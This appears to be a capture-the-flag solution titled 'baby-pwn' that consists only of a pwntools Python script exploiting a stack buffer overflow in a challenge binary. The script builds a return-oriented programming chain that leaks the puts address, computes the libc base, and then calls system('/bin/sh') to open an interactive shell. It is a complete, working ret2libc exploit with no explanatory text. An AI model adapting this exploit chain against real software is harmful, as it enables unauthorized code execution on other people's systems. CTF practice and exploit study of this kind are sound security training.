---
title: "baby-pwn"
points: N/A
tags: ["pwn"]
---

```python
from pwn import *

binary_name = "./vuln"
elf = context.binary = ELF(binary_name)
DEBUG = True

if DEBUG:
    p = gdb.debug(binary_name, '''
        break *main+111
        continue
    ''')
else:
    p = process(binary_name)

# leak puts
rop = ROP(elf)
rop.raw(b'a'*264)
rop.raw(rop.find_gadget(['pop rdi'])[0])
rop.raw(p64(elf.got['puts']))
rop.raw(p64(elf.plt['puts']))
rop.raw(p64(elf.symbols['main']))
p.recvline() # What do you want me to echo back>
p.sendline(rop.chain())
p.recvline() # echo back
leak = u64(p.recvline().rstrip().ljust(8, b'\x00'))
print(hex(leak))

# calc libc address
if DEBUG:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = leak - libc.symbols['puts']
else:
    buildid = libcdb.search_by_symbol_offsets({'puts':leak},return_as_list=True)[0]
    libc = ELF(libcdb.search_by_build_id(buildid,unstrip=False))

# call system
rop = ROP(elf)
rop.raw(b'a'*264)
rop.raw(rop.find_gadget(['pop rdi'])[0]+1)
rop.raw(rop.find_gadget(['pop rdi'])[0])
rop.raw(next(libc.search(b'/bin/sh\x00')))
rop.raw(libc.symbols['system'])
rop.raw(elf.symbols['main'])
p.recvline() # What do you want me to echo back>
p.sendline(rop.chain())
p.recvline() # echo back

p.interactive()
```